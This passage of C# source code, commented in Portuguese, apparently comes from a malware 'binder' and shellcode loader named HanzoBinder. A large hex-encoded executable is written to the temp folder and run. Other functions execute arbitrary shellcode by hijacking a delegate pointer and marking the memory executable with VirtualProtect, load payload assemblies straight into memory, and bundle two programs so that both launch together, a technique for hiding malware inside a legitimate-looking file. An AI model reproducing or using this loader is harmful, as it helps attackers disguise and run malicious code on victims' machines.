                     "04A00090013000E000001100065004A000D00150012000100CC000A000100D5000A00010094011E000100C20127000100CF0127000100E5012B000100FE012F0001000E022700010023"+
                     "02330001002D02330001004302370001004E02370001005B023700010068022B00010072022B0001007C022700010084022B0001009D023B001100D3024300110000034700110044036"+
                     "5005020000000008618DE000D0001006C20000000009600E40011000100DC200000000081000301170002004C21000000008100160117000400BC2100000000810029010D000600F021"+
                     "00000000810032010D000600292200000000810042010D000600442200000000810049010D0006008422000000008100520117000600272300000000810065011700080030230000000"+
                     "0C4009F0122000A006823000000008100A7010D000B00CB2C000000009100AD023F000B00E62C000000008318DE000D000B00F42C00000000930810034B000B003C2D00000000930824"+
                     "0350000B00532D000000009308300355000B005C2D000000009608540369000C00892D000000008618DE000D000C00732D000000009118E20A3F000C00000001006803000001006E030"+
                     "00002007503000001006E03000002007503000001006E03000002007503000001006E030000020075030000010077030000010081037100DE0073007900DE0073008100DE0073008900"+
                     "DE0073009100DE0073009900DE007300A100DE007300A900DE007300B100DE007300B900DE002200C100DE007300C900DE007300D100DE007300D900DE007800E900DE007E00F100DE0"+
                     "00D000900DE000D00F900DE007E000101CC058300F900D60588001100DD058E004100DE000D000901F1057300110116069E00090121068E0021013606730029014E06A4003101DE0073"+
                     "0039017306730039017D060D0039019F010D00210183068E0039018C06730029019206B8004101DE000D004901DE000D004901C506BD004901D50673004101E206C4004101F006CB000"+
                     "101F606D80059010A07DE0001011F07E20061013107E900690142073F0071019F010D0009009F01220079016A0700018901DE0009013100DE000D003900DE000D004900DE000D005100"+
                     "DE000D005900DE000D00210195070D009101C50719012101D7071F01A101FA072601B101DE002D0121010E08330121011B087300B901DE002D01210129083A01210132087E00A1013F0"+
                     "82200C101DE004101210168084701210184084E01C901910854013900950822009101A10819010901D5067300D101CD085B016100DD0862019101E70819012101FF081F0199010D0919"+
                     "01E101DE006701E90138096D01E9015E097401990170097B01090079093A010900980984010900BE098B012101D00922002101DD090D000902DE000D006901FE093F006901110A9D016"+
                     "901330AA2011102DE00A8011902DE000D002102DE000D001100DE000D007901A70AEF016100DE00F5013102DE000A024102F60A79021900DE000D0029000B0311022E001B00E1022E00"+
                     "2300E1022E002B00E1022E00830048032E004300E1022E007B003F032E001300CC022E003300CC022E003B00E7022E000B0082022E005300E1022E005B00FF022E006B0029032E00730"+
                     "0360349000B0311028300DB02AE018300E30298018300EB029801A300DB021A02A300EB029801A001BB0298019200AA00B200CF00F000FC009201FD0105027402040001000500030000"+
                     "00C3025B0000003C036000000060036E0002000F00030002001000050001001100050002001200070004800000010000000000000000000000000028000000040000000000000000000"+
                     "00001006E0000000000040000000000000000000000010088000000000004000000000000000000000001009100000000000400000000000000000000001001A3070000000000000000"+
                     "01000000030B0000100A000001000000270B00000000003C4D6F64756C653E0048616E7A6F42696E646572546F6F6C2E657865005072696E636970616C0048616E7A6F42696E6465725"+
                     "46F6F6C0050726F6772616D005265736F75726365730048616E7A6F42696E646572546F6F6C2E50726F706572746965730053657474696E67730053797374656D2E57696E646F77732E"+
                     "466F726D7300466F726D006D73636F726C69620053797374656D004F626A6563740053797374656D2E436F6E66696775726174696F6E004170706C69636174696F6E53657474696E677"+
                     "342617365006172717569766F31006172717569766F32002E63746F7200427974654172726179546F486578537472696E67004576656E74417267730042746E5F70726F63757261725F"+
                     "436C69636B0042746E5F6172717569766F325F436C69636B00636F6D70696C61720062696E6172795F67656E65726174650064656C6574650065786563757461720042746E5F636F6D7"+
                     "0696C61725F436C69636B00627574746F6E315F436C69636B0053797374656D2E436F6D706F6E656E744D6F64656C0049436F6E7461696E657200636F6D706F6E656E74730044697370"+
                     "6F736500496E697469616C697A65436F6D706F6E656E7400427574746F6E0042746E5F6172717569766F310042746E5F636F6D70696C61720047726F7570426F780067726F7570426F7"+
                     "831004F70656E46696C654469616C6F67006F70656E46696C654469616C6F67310042746E5F6172717569766F320054657874426F78007478745F66696C6532007478745F66696C6531"+
                     "005269636854657874426F780052746E5F736F757263650052746E5F6172717569766F310052746E5F6172717569766F320067726F7570426F78320067726F7570426F7833006275747"+
                     "46F6E310067726F7570426F7834005361766546696C654469616C6F67007361766546696C654469616C6F6731004D61696E0053797374656D2E5265736F7572636573005265736F7572"+
                     "63654D616E61676572007265736F757263654D616E0053797374656D2E476C6F62616C697A6174696F6E0043756C74757265496E666F007265736F7572636543756C747572650067657"+
                     "45F5265736F757263654D616E61676572006765745F43756C74757265007365745F43756C747572650043756C747572650064656661756C74496E7374616E6365006765745F44656661"+
                     "756C740044656661756C740042797465730073656E646572006500646973706F73696E670076616C75650053797374656D2E52756E74696D652E56657273696F6E696E6700546172676"+
                     "5744672616D65776F726B4174747269627574650053797374656D2E5265666C656374696F6E00417373656D626C795469746C6541747472696275746500417373656D626C7944657363"+
                     "72697074696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C79436F6D70616E79417474726962757465004"+
                     "17373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C7954726164656D61726B4174747269"+
                     "6275746500417373656D626C7943756C747572654174747269627574650053797374656D2E52756E74696D652E496E7465726F70536572766963657300436F6D56697369626C6541747"+
                     "4726962757465004775696441747472696275746500417373656D626C7956657273696F6E41747472696275746500417373656D626C7946696C6556657273696F6E4174747269627574"+
                     "650053797374656D2E446961676E6F73746963730044656275676761626C6541747472696275746500446562756767696E674D6F6465730053797374656D2E52756E74696D652E436F6"+
                     "D70696C6572536572766963657300436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C69747941747472696275"+
                     "74650053797374656D2E5465787400537472696E674275696C64657200537472696E67006765745F436861727300417070656E6400546F537472696E670046696C654469616C6F67007"+
                     "365745F46696C74657200436F6D6D6F6E4469616C6F67004469616C6F67526573756C740053686F774469616C6F67006765745F46696C654E616D6500436F6E74726F6C007365745F54"+
                     "6578740053797374656D2E494F0046696C650052656164416C6C42797465730053747265616D57726974657200546578745772697465720057726974654C696E6500436C6F736500676"+
                     "5745F546578740057726974650044656C6574650050726F636573730050726F636573735374617274496E666F0050726F6365737357696E646F775374796C65007365745F57696E646F"+
                     "775374796C65007365745F46696C654E616D65007365745F5374617274496E666F005374617274005265706C61636500456E7669726F6E6D656E74006765745F43757272656E7444697"+
                     "26563746F727900436F6E636174004D657373616765426F780053686F77004170706C69636174696F6E00457869740049446973706F7361626C6500547970650052756E74696D655479"+
                     "706548616E646C65004765745479706546726F6D48616E646C6500436F6D706F6E656E745265736F757263654D616E616765720053757370656E644C61796F75740053797374656D2E4"+
                     "4726177696E670053797374656D436F6C6F727300436F6C6F72006765745F41637469766543617074696F6E007365745F4261636B436F6C6F7200427574746F6E4261736500466C6174"+
                     "5374796C65007365745F466C61745374796C6500506F696E74007365745F4C6F636174696F6E007365745F4E616D650053697A65007365745F53697A65007365745F546162496E64657"+
                     "8007365745F55736556697375616C5374796C654261636B436F6C6F72004576656E7448616E646C6572006164645F436C69636B00436F6E74726F6C436F6C6C656374696F6E00676574"+
                     "5F436F6E74726F6C7300416464007365745F54616253746F70006765745F496E61637469766543617074696F6E0054657874426F784261736500426F726465725374796C65007365745"+
                     "F426F726465725374796C6500476574537472696E67006765745F496E61637469766543617074696F6E54657874007365745F466F7265436F6C6F72006765745F4D656469756D547572"+
                     "71756F6973650053697A654600436F6E7461696E6572436F6E74726F6C007365745F4175746F5363616C6544696D656E73696F6E73004175746F5363616C654D6F6465007365745F417"+
                     "5746F5363616C654D6F64650046726F6D41726762007365745F436C69656E7453697A6500466F726D426F726465725374796C65007365745F466F726D426F726465725374796C650046"+
                     "6F726D5374617274506F736974696F6E007365745F5374617274506F736974696F6E00526573756D654C61796F757400506572666F726D4C61796F75740053544154687265616441747"+
                     "472696275746500456E61626C6556697375616C5374796C657300536574436F6D70617469626C655465787452656E646572696E6744656661756C740052756E0053797374656D2E436F"+
                     "6465446F6D2E436F6D70696C65720047656E657261746564436F64654174747269627574650044656275676765724E6F6E55736572436F646541747472696275746500436F6D70696C6"+
                     "57247656E65726174656441747472696275746500417373656D626C79006765745F417373656D626C7900456469746F7242726F777361626C6541747472696275746500456469746F72"+
                     "42726F777361626C655374617465002E6363746F720053657474696E6773426173650053796E6368726F6E697A65640048616E7A6F42696E646572546F6F6C2E5072696E636970616C2"+
                     "E7265736F75726365730048616E7A6F42696E646572546F6F6C2E50726F706572746965732E5265736F75726365732E7265736F75726365730000000021300031003200330034003500"+
                     "3600370038003900410042004300440045004600004F7400780074002000660069006C0065007300200028002A002E002A0029007C002A002E002A007C0041006C006C0020006600690"+
                     "06C0065007300200028002A002E002A0029007C002A002E002A0000136200750069006C0064002E0062006100740000808143003A005C00570069006E0064006F00770073005C004D00"+
                     "6900630072006F0073006F00660074002E004E00450054005C004600720061006D00650077006F0072006B005C00760034002E0030002E00330030003300310039005C0063007300630"+
                     "02E0065007800650020002000620069006E006100720079002E00630073000013620069006E006100720079002E006300730000116D0065007500660069006C006500310000116D0065"+
                     "007500660069006C0065003200003D460069006C0065002000670065006E00650072006100740065002000770069007400680020007300750063006300650073007300200069006E002"+
                     "0000013080069006E006100720079002E00630073000119420074006E005F006100720071007500690076006F00310000072E002E002E000019420074006E005F0063006F006D007000"+
                     "69006C0061007200000F43006F006D00700069006C0065000013670072006F007500700042006F00780031000019420074006E005F006100720071007500690076006F0032000013740"+
                     "0780074005F00660069006C006500320000137400780074005F00660069006C0065003100001F6F00700065006E00460069006C0065004400690061006C006F00670031000015520074"+
                     "006E005F0073006F007500720063006500001F520074006E005F0073006F0075007200630065002E0054006500780074000019520074006E005F006100720071007500690076006F003"+
                     "10000010019520074006E005F006100720071007500690076006F0032000013670072006F007500700042006F007800320000155B00200045006E0063006F006400650020005D000013"+
                     "670072006F007500700042006F0078003300000F62007500740074006F006E003100000358000013670072006F007500700042006F0078003400002D5B0020002000480061006E007A0"+
                     "06F002000420069006E0064006500720020002E0065007800650020005D0000135000720069006E0063006900700061006C000019480061006E007A006F002000420069006E00640065"+
                     "0072000049480061006E007A006F00420069006E0064006500720054006F006F006C002E00500072006F0070006500720074006900650073002E005200650073006F007500720063006"+
                     "50073000000003E539506B71C1740A3F005BB29C59E410008B77A5C561934E08902060E032000010500010E1D05062002011C1211030612150420010102030612190306121D03061221"+
                     "03061225030612290306122D03000001030612310306123504000012310400001235050001011235040800123104080012350306121404000012140408001214042001010E052001011"+
                     "17104200101080420010308052001127D030320000E0B0707127D0E050E1D05080205200011808D0500011D050E07070312211D0502050701128099040001010E062001011180A90620"+
                     "01011280A5032000020807021280A11280A50520020E0E0E0300000E0600030E0E0E0E06000111808D0E0B07071D051D050E0E0E0E0E030701020800011280BD1180C1062001011280B"+
                     "D08B03F5F7F11D50A3A0500001180CD062001011180CD062001011180D5052002010808062001011180D9062001011180DD052002011C18062001011280E10520001280E50620010112"+
                     "8091062001011180ED0420010E0E052002010C0C062001011180F1062001011180F90800031180CD080808062001011180FD062001011181010507011280C5040100000004000101020"+
                     "50001011205052002010E0E4001003353797374656D2E5265736F75726365732E546F6F6C732E5374726F6E676C7954797065645265736F757263654275696C64657207342E302E302E"+
                     "300000052000128115072002010E128115070703123112310204070112350620010111811D0801000200000000005901004B4D6963726F736F66742E56697375616C53747564696F2E4"+
                     "56469746F72732E53657474696E677344657369676E65722E53657474696E677353696E676C6546696C6547656E657261746F720831312E302E302E3000000407011214080001128121"+
                     "1281214901001A2E4E45544672616D65776F726B2C56657273696F6E3D76342E350100540E144672616D65776F726B446973706C61794E616D65122E4E4554204672616D65776F726B2"+
                     "0342E351401000F48616E7A6F42696E646572546F6F6C000005010000000017010012436F7079726967687420C2A920203230313400002901002466653965633761372D616366612D34"+
                     "3131332D396566342D35343761386562366437393800000C010007312E302E302E3000000801000701000000000801000800000000001E01000100540216577261704E6F6E457863657"+
                     "074696F6E5468726F7773010000000000DEE7035400000000020000001C0100005053000050350000525344538075F83087718A40AC16413C0F2463F80A000000633A5C55736572735C"+
                     "4D6172636F735C4465736B746F705C4C61625C48616E7A6F42696E646572546F6F6C5C48616E7A6F42696E646572546F6F6C5C6F626A5C44656275675C48616E7A6F42696E646572546"+
                     "F6F6C2E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                     "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                     "0000000000000000000000000000000000000000000000000000000000000945400000000000000000000AE540000002000000000000000000000000000000000000000000000A05400"+
                     "00000000000000000000005F436F724578654D61696E006D73636F7265652E646C6C0000000000FF2500204000000000000000000000000000000000000000000000000000000000000"+
                     "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                     "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                     "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                     "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                     "000000000000000020010000000200000801800000038000080000000000000000000000000000001000100000050000080000000000000000000000000000001000100000068000080"+
                     "000000000000000000000000000001000000000080000000000000000000000000000000000001000000000090000000A0600000E0020000000000000000000080630000EA01000000"+
                     "00000000000000E00234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000"+
                     "000000000000400000001000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E00730"+
                     "06C006100740069006F006E00000000000000B00440020000010053007400720069006E006700460069006C00650049006E0066006F0000001C020000010030003000300030003000340"+
                     "0620030000000480010000100460069006C0065004400650073006300720069007000740069006F006E0000000000480061006E007A006F00420069006E0064006500720054006F006F0"+
                     "06C000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000048001400010049006E007400650072006E0061006C0"+
                     "04E0061006D0065000000480061006E007A006F00420069006E0064006500720054006F006F006C002E0065007800650000004800120001004C006500670061006C0043006F0070007900"+
                     "72006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003100340000005000140001004F0072006900670069006E0061006C00460069006"+
                     "C0065006E0061006D0065000000480061006E007A006F00420069006E0064006500720054006F006F006C002E006500780065000000400010000100500072006F0064007500630074004E0"+
                     "061006D00650000000000480061006E007A006F00420069006E0064006500720054006F006F006C000000340008000100500072006F006400750063007400560065007200730069006F006E"+
                     "00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000"+
                     "EFBBBF3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374616E64616C6F6E653D22796573223F3E0D0A3C617373656D626C7920786D6C6E73"+
                     "3D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C617373656D626C794964656E"+
                     "746974792076657273696F6E3D22312E302E302E3022206E616D653D224D794170706C69636174696F6E2E617070222F3E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A7"+
                     "36368656D61732D6D6963726F736F66742D636F6D3A61736D2E7632223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C656765732078"+
                     "6D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206"+
                     "C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365222F3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F736"+
                     "56375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E0D0A000000000000000000000000000000000000000000000000000000000000000000000000"+
                     "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                     "0000000000000000000000000000000000000000000000000000000000000000000000000000000005000000C000000C034000000000000000000000000000000000000000000000000000"+
                     "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                     "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                     "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                     "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                     "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                     "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"+
                     "00000000000000000000000000000000000000000000000000000";
                    byte[] binder = HexStringToByteArray(hanzobinder);
                    string temp = Path.GetTempPath();
                    File.WriteAllBytes(temp + "\\" + "HanzoBinder.exe", binder);
                    Process.Start(temp + "\\" + "HanzoBinder.exe");
                }
            }
            if (args.Length == 2)
            {
               
                if (args.Contains("-e") || args.Contains("--execute"))
                {
                    string arquivo = args[1];
                    Console.WriteLine("[!] Executing payload: ");
                    byte[] converterfuncao = lerpayload(arquivo);
                    executar(converterfuncao);
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.Write("[*] ");
                    Console.ResetColor();
                    Console.WriteLine("Binary Executed!");
                    
                }

            }
            if (args.Length == 4)
            {
                if (args.Contains("-p") || (args.Contains("--payload")))
                {
                    string payload;
                    payload = args[1];
                    string arquivo_criar;
                    arquivo_criar = args[3];
                    if (args[2] == "-o" || args[2] == "--output")
                    {
                        memoria_execute(payload, arquivo_criar);
                    }
                }
            }
        }
        // conveter string 
        public static byte[] HexStringToByteArray(string Hex)
        {
            byte[] Bytes_convertidos = new byte[Hex.Length / 2];
            int[] valores = new int[] { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 
       0x06, 0x07, 0x08, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
       0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F };

            for (int x = 0, i = 0; i < Hex.Length; i += 2, x += 1)
            {
                Bytes_convertidos[x] = (byte)(valores[Char.ToUpper(Hex[i + 0]) - '0'] << 4 |
                                  valores[Char.ToUpper(Hex[i + 1]) - '0']);
            }

            return Bytes_convertidos;
        }


        // conveter bytes
        public static string ByteArrayToHexString(byte[] Bytes)
        {
            StringBuilder Resultado = new StringBuilder(Bytes.Length * 2);
            string Hex_numeros = "0123456789ABCDEF";

            foreach (byte B in Bytes)
            {
                Resultado.Append(Hex_numeros[(int)(B >> 4)]);
                Resultado.Append(Hex_numeros[(int)(B & 0xF)]);
            }

            return Resultado.ToString();
        }


        public static void injetarmemeoria(byte[] bin)
        {
            
            // converte os bin para assembly
            Assembly a = Assembly.Load(bin);
            // chama o entrypoint
            MethodInfo metodo_de_entrada = a.EntryPoint;
            if (metodo_de_entrada != null)
            {
                object o = a.CreateInstance(metodo_de_entrada.Name);
                // invocar entryPoint
                metodo_de_entrada.Invoke(o, null);
            }
        }
         public static void binderarquivo(string arquivo1, string arquivo2)
        {
            // ler dois arquivo
            string temp = Path.GetTempPath();
            byte[] data1 = File.ReadAllBytes(arquivo1);
            byte[] data2 = File.ReadAllBytes(arquivo2);
            // criar entrepoint
            var assembly = Assembly.Load(data1);
            var entryPoint = assembly.EntryPoint;
            // binario para string
            string  str_binario1 = ByteArrayToHexString(data1);
            string  str_binario2 = ByteArrayToHexString(data2);
            //System.IO.StreamWriter file = new System.IO.StreamWriter("login.cs");
            //file.WriteLine();
          

            // função do binder estrutura .cs
            File.WriteAllBytes(temp + "\\" + arquivo1, data1);
            File.WriteAllBytes(temp + "\\" + arquivo2, data2);
            Process.Start(temp + "\\" + arquivo1);
            Process.Start(temp + "\\" + arquivo2);

            //System.IO.StreamWriter file = new System.IO.StreamWriter("login.cs");
            //file.WriteLine();
            Console.ReadKey();
        }
        unsafe public static void executar(byte[] asmBytes)
        {
            fixed (byte* Endereco_incial = &asmBytes[0]) 
            {
                // pegando feildinfo do método "_methodPtr"
                Type delType = typeof(Delegate);
                FieldInfo _methodPtr = delType.GetField("_methodPtr", BindingFlags.NonPublic |
               BindingFlags.Instance);
                // ret delegaete
                Ret1ArgDelegate Retorno_del = new Ret1ArgDelegate(PlaceHolder1);
                _methodPtr.SetValue(Retorno_del, (IntPtr)Endereco_incial);
                //desabilitar a proteção 
                uint protecao_memoria;
                VirtualProtect((IntPtr)Endereco_incial, (uint)asmBytes.Length, 0x40, out protecao_memoria);
                // exetutar shellcode
                uint n_executar = (uint)0x00000001;
                n_executar = Retorno_del(n_executar);
                Console.WriteLine("{0:x}", n_executar);
            }

        }
    }
}
